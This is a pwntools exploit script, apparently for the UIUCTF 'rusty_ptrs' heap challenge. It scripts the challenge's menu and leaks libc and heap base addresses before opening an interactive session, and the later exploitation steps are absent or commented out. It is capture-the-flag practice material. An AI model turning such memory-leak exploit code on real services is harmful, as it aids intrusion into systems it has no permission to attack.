#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './rusty_ptrs'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc-2.31.so'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'rustyptrs.chal.uiuc.tf', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port, ssl=True)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
RULES=1
NOTES=2

def create(flavour):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'>', str(flavour).encode())

def delete(flavour, idx):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'>', str(flavour).encode())
    io.sendlineafter(b'>', str(idx).encode())

    kind = 'RULES' if flavour == 1 else 'NOTES'
    if not b'Deleted' in io.recvline():
        log.failure(f'failed to delete {kind} {idx}')
    else:
        log.success(f'deleted {kind} {idx}')

def read(flavour, idx):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'>', str(flavour).encode())
    io.sendlineafter(b'>', str(idx).encode())

def edit(flavour, idx, data):
    io.sendlineafter(b'>', b'4')
    io.sendlineafter(b'>', str(flavour).encode())
    io.sendlineafter(b'>', str(idx).encode())
    io.sendafter(b'>', data)

def exploit():
    global io
    io = initialize()

    # libc leak
    io.sendlineafter(b'>', b'5')
    libc.address = int(io.recvuntil(b',', drop=True).strip(), 16) - 0x1ecbe0

    # heap leak
    create(RULES)
    read(RULES, 0)
    io.recvuntil(b', 0x')
    # heap = (int(io.recvline().strip(), 16) << 12) - 0x2000
    heap = int(io.recvline().strip(), 16) - 0x10 

    # for idx in range(20):
    #     create(NOTES)
    #     edit(NOTES, idx, str(idx).encode()*0x8)
    # for idx in range(20):
    #     delete(NOTES, 0)

    log.info('heap base: %#x', heap)
    log.info('libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()